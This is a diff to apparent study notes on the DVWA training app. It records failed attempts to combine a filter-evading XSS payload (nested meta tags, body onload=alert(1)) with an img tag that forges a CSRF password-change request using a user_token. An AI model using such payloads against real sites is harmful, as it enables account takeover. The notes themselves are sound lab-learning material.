@@ -54,4 +54,5 @@
       * <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=pswd&password_conf=pswd&Change=Change> makes requests to /csrf/, but it doesn't change the password.
       * I've second guessed myself and added a token too, <body<meta>><<meta>body onload=alert(1)><<meta>img src="/dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change&user_token=4202d63409c601b9230b4834ffa92a89">
         But this didn't work either.
+  * It looked like the user_token value that was hidden on the /csrf/ page was changing whenever I made a request to it.
   * At this point, I was stuck and researched for solutions and the source code
